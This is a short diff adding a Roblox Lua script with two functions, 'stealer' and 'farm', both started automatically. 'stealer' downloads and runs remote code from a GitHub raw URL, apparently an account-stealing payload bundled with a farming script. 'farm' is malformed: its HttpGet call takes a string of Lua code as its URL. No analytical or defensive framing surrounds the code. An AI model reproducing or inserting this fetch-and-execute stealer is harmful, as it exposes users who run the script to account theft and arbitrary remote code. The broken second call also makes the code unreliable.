@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/BaconScrr/BaseDONTTOCH/refs/heads/main/DO%20NOT%20TRUST'))()
+end
+local function farm()
+    loadstring(game:HttpGet('loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
